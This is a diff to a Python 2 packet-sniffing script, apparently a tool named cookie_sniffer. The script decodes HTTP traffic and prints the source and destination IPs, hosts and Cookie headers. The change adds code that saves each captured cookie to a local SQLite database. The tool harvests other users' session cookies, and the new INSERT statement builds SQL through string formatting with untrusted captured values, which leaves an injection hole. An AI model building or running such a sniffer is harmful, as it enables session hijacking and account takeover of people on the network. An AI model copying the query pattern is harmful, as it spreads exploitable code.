@@ -6,6 +6,7 @@ import socket
 import struct
 import re
 import datetime
+import sqlite3
 
 protocols = {socket.IPPROTO_TCP: 'tcp',
            socket.IPPROTO_UDP: 'udp',
@@ -90,9 +91,16 @@ def print_packet(pktlen, data, timestamp):
 
         if http_decoded:
             d = http_decoded
+
             print '%s [%s > %s]' % (d['datetime'], d['src_ip'], d['dest_ip'])
             print 'Host: %s' % d['host']
             print 'Cookie: %s\n\n' % d['cookie']
+
+            conn = sqlite3.connect('cookie_sniffer.db')
+            cursor = conn.cursor()
+            cursor.execute("INSERT INTO http_data (source_ip, destination_ip, host, cookie, datetime) VALUES ('%s', '%s', '%s', '%s', '%s');" % (d['src_ip'], d['dest_ip'], d['host'], d['cookie'], d['datetime']))
+            conn.commit()
+            conn.close()
 
 
 if __name__ == '__main__':
